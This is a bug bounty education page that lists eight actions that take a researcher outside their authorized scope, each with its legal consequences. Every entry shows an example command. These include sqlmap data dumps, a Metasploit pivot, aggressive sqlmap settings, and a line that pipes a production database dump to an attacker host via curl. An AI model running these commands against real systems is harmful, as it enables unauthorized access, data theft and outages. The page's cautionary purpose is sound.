CATEGORY 08

Out-of-Scope
Actions

Actions that turn perfectly legal tools into criminal acts. Any tool becomes illegal the moment you use it outside your authorized scope — intent does not matter.

01
Illegal Actions & What They Do
ACTION 01
Testing out-of-scope subdomains
nmap -sV out-of-scope.target.com
Even though nmap is a legal tool, running it on assets not listed in your scope is unauthorized access to a computer system. The program's legal protection only covers explicitly listed assets. "I was just scanning" is not a valid defence — intent to access is enough.
→ Unauthorized computer access charge under CFAA
ACTION 02
Dumping real user PII from a database
sqlmap --dump -T users -D prod_db
Once you confirm SQLi exists, your job is to document and report it — not extract data. Running --dump pulls real customer names, emails, passwords, addresses, and payment information out of the production database. This is data exfiltration: you now possess stolen personal data, which triggers GDPR, CCPA, and criminal data theft statutes on top of CFAA charges.
→ GDPR / CCPA data breach + criminal data theft charges
ACTION 03
Pivoting to internal networks after RCE
run post/multi/manage/shell_to_meterpreter
Getting RCE on a web server is a critical finding — stop there and report it. Pivoting through the server into the internal corporate network means you are now accessing systems that were never in scope, interacting with production databases, internal infrastructure, and potentially other companies' systems hosted in the same environment.
→ Felony unauthorized access — years in federal prison
ACTION 04
Selling or holding a vulnerability unreported
(any exploit held, sold on dark markets, or shared with third parties)
Bug bounty programs give you a legal safe harbour only if you report findings promptly through their disclosure process. Sitting on a vulnerability, selling it to a third party, or using it for personal gain turns you from a researcher into a criminal. Zero-day brokers do not protect you — they expose you to law enforcement in every jurisdiction where the target operates.
→ Criminal liability for weaponizing + selling exploits
ACTION 05
Scanning AWS / Cloudflare infrastructure
nmap -sV ec2-xx-xx.compute.amazonaws.com
AWS, Cloudflare, and other cloud infrastructure providers are third-party platforms — they are never in the scope of a bug bounty program targeting a web application. Scanning AWS EC2 instances, RDS endpoints, or Cloudflare IPs directly means you are attacking Amazon or Cloudflare's infrastructure, not your target's. Their legal and abuse teams respond aggressively to unauthorized scanning.
→ AWS / Cloudflare legal team pursues you directly
ACTION 06
Exfiltrating real user data as "proof"
mysqldump prod_db > dump.sql && curl -T dump.sql ftp://attacker.com
Programs never require you to exfiltrate real data to prove a vulnerability. A screenshot of one record with PII redacted, or a dummy record you inserted yourself, is always sufficient proof. Pulling and transferring a full database dump means you have committed data theft and data exfiltration — two separate additional crimes on top of the access violation.
→ Data theft + exfiltration charges + civil lawsuit from platform
ACTION 07
Testing third-party login providers
# Probing Google OAuth, Facebook Login, Apple SSO, Okta endpoints
When you exploit a bug that involves a Google OAuth or Facebook Login endpoint, you are touching Google's and Facebook's infrastructure — neither of which authorized you. Even if the vulnerability lives in how the target site handles the OAuth callback, directly probing the identity provider's servers is out of scope and the IdP's security team will report you.
→ Out of scope — Google / Meta / Apple legal pursues you
ACTION 08
Aggressive automated scanning on production
sqlmap -u 'https://prod.target.com/api?id=1' --level=5 --risk=3 --dbs
sqlmap at level=5, risk=3 sends time-based blind payloads, heavy union injections, and stacked queries that can corrupt database integrity, lock tables, consume all available DB connections, and cause real production downtime. Even if the target is in scope, causing actual damage or outage — even accidentally — removes your safe harbour and can result in civil damages claims against you personally.
→ Can corrupt production data + legal action for damages
⚖ Scope is your legal contract. The moment you step outside it, you lose all protection provided by the bug bounty program. You become an unauthorized attacker in the eyes of the law — regardless of intent, regardless of how you found the target.
